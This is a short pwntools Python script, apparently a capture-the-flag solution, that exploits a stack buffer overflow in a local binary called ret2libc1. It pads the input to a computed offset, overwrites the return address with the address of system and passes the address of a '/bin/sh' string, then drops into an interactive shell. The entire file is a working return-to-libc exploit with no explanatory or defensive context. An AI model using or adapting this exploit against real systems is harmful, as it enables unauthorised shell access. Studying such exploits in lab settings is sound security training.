from pwn import *

bin_sh_addr = 0x08048720
system_addr = 0x08048460
offset = 0xFFB6CF98-0xFFB6CF2C+4

payload = ( offset * b'A'\
			+ p32(system_addr) + p32(0x0)\
			+ p32(bin_sh_addr))
sh = process("./ret2libc1")
sh.sendline(payload)
sh.interactive()
